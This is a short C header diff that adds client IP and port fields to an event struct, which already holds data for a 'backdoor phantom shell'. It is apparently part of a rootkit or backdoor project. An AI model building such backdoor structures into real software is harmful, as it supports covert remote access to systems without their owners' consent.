@@ -20,6 +20,8 @@ struct rb_event {
     int code;
     struct backdoor_phantom_shell_data bps_data;
     event_type_t event_type;
+    __u32 client_ip;
+    __u16 client_port;
 };
 
 #endif
